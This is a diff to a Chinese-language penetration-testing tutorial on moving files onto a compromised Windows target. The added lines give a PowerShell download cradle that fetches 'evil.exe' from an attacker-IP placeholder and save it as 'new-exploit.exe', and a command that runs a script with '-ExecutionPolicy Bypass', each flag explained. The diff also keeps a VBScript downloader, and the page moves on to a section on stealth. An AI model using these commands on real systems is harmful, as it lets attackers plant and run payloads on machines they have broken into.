@@ -182,8 +182,6 @@ quit
 
 该脚本适用于VBScript：Windows XP / Windows 2003&#x20;
 
-该脚本适用于Powershell：Windows 7 / Windows 2008 / 及以上版本
-
 ```powershell
 // Target
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -215,12 +213,36 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
 
+<pre class="language-powershell"><code class="lang-powershell">// Target
+<strong>cscript wget.vbs http://攻方IP/evil.exe evil.exe
+</strong></code></pre>
+
+该脚本适用于Powershell：Windows 7 / Windows 2008 / 及以上版本
+
 ```powershell
 // Target
-cscript wget.vbs http://攻方IP/evil.exe evil.exe
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://攻方IP/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+// 设置wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+// 执行wget.ps1
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://攻方IP/evil.exe', 'new-exploit.exe')
 ```
 
-## 隐蔽方式
+* `powershell.exe`: 启动 PowerShell 解释器。
+* `-ExecutionPolicy Bypass`: 设置脚本执行策略为 Bypass，即绕过执行策略限制，允许执行未签名的脚本。
+* `-NoLogo`: 执行时不显示 PowerShell 的启动标志。
+* `-NonInteractive`: 设置为非交互模式，即不会提示用户进行任何交互操作。
+* `-NoProfile`: 在执行过程中不加载 PowerShell 用户配置文件。
+* `-File wget.ps1`: 指定要执行的 PowerShell 脚本文件，这里假设文件名为 wget.ps1。
+
+## 隐蔽
+
+## 方式
 
 ```bash
 // Attacker
